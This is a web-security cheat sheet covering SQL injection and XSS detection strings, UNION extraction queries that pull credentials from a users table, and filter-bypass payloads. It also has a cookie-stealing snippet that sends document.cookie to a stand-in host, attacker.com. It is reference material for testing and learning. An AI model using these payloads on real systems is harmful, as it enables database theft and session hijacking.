# XSS and SQL Injection Basics

Quick reference for common web vulnerabilities.

---

## SQL Injection (SQLi)

### What is it?
Injecting SQL code into application queries to manipulate the database.

### Detection
Test input fields with:
```
'
"
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1' AND '1'='1
1' AND '1'='2
```

Look for:
- Error messages (MySQL, MSSQL, Oracle errors)
- Different page behavior
- Time delays

### Types

| Type | Description | Example |
|:-----|:------------|:--------|
| **In-band** | Results visible in response | UNION SELECT |
| **Blind (Boolean)** | True/False responses differ | ' AND 1=1-- vs ' AND 1=2-- |
| **Blind (Time)** | Uses time delays | ' AND SLEEP(5)-- |
| **Out-of-band** | Data exfiltrated externally | DNS lookups |

### UNION-Based SQLi

```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- (increment until error)

-- Find displayable column
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Extract data
' UNION SELECT username,password,NULL FROM users--
```

### Common Payloads

```sql
-- MySQL
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL,NULL--

-- Oracle
' UNION SELECT banner,NULL FROM v$version--

-- PostgreSQL
' UNION SELECT version(),NULL,NULL--
```

### Bypass Techniques

| Technique | Example |
|:----------|:--------|
| Case variation | `SeLeCt` instead of `SELECT` |
| Comments | `SEL/**/ECT` |
| URL encoding | `%27` for `'` |
| Double encoding | `%2527` |
| Null bytes | `%00` |

---

## Cross-Site Scripting (XSS)

### What is it?
Injecting malicious JavaScript that executes in victims' browsers.

### Types

| Type | Description |
|:-----|:------------|
| **Reflected** | Payload in URL, reflected back |
| **Stored** | Payload saved in database |
| **DOM-based** | Payload processed by client-side JS |

### Detection
Test input fields and URL parameters with:
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Basic Payloads

```html
<!-- Script tag -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

<!-- href/src -->
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
```

### Cookie Stealing

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>
```

### Bypass Techniques

| Filter | Bypass |
|:-------|:-------|
| `<script>` blocked | Use event handlers: `<img onerror=...>` |
| `alert` blocked | Use `confirm`, `prompt`, `console.log` |
| Quotes blocked | Use backticks: `` alert`1` `` |
| Parentheses blocked | Use `throw` or template literals |
| Spaces blocked | Use `/` or comments |

```html
<!-- No parentheses -->
<script>alert`XSS`</script>
<img src=x onerror=alert`1`>

<!-- HTML encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

---

## Quick Testing Checklist

### SQL Injection
- [ ] Test all input fields with `'` and `"`
- [ ] Check URL parameters
- [ ] Look for error messages
- [ ] Try time-based: `' AND SLEEP(5)--`
- [ ] Use SQLMap for automation

### XSS
- [ ] Test all input fields with basic payloads
- [ ] Check if input is reflected in response
- [ ] Check URL parameters
- [ ] Look at how output is encoded
- [ ] Try different contexts (HTML, JS, attributes)

---

## Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [XSS Hunter](https://xsshunter.com/)
